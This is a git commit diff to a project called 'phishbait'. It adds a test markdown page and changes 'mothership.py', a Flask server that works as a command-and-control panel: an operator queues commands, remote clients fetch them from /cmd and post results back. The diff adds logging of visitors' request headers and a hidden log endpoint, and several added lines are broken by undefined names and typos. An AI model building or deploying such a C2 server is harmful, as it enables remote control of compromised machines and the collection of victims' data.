11512a7e4035621359d768c814c507c050c23a6e
William L. Solem <61805186+milliesolem@users.noreply.github.com>
2024-06-06 04:32:10 +0200

    sdfsdf
    sdfsfsdf

---
+++ blog/test.md
@@ -0,0 +1,2 @@
+# Test
+this is a test to check how markdown rendering works on GitHub Pages
--- phishbait/mothership.py
+++ phishbait/mothership.py
@@ -1,10 +1,12 @@
 
 
 from flask import Flask,redirect,request
+from datetime import datetime
 
 app = Flask(__name__)
 cmdstack = []
 rdata = []
+visitors = []
 
 @app.route('/')
 def hmmm():
@@ -16,11 +18,15 @@ def index():
     <style>
         body{{
             background-color:#222222;
+            color: white;
         }}
     </style>
     <br/>
+    <h1>Queue:</h1>
     {"<br/>".join(cmdstack)}
+    <h1>Returned data:</h1>
     {"<br/>".join(rdata)}
+    <h1>Command:</h1>
      <form action="/lol" method="post">
         <input type="text" id="command" name="command" /><br><br>
         <input type="submit" value=">">
@@ -33,6 +39,8 @@ def lol():
     return redirect('/banana', code=302)
 @app.route('/cmd')
 def cmd():
+    if not ip in visitors:
+        vistors[ip] = [datetime.now(),dict(request.headers)]
     if not len(cmdstack):
         return ''
     return cmdstack.pop()
@@ -40,6 +48,9 @@ def cmd():
 def rsp(data):
     rdata.append(data)
     return 'lol'
+@app.rout('visitlog23')
+def log():
+    return visitors
 
 if __name__=='__main__':
     app.run('0.0.0.0',port=1337)
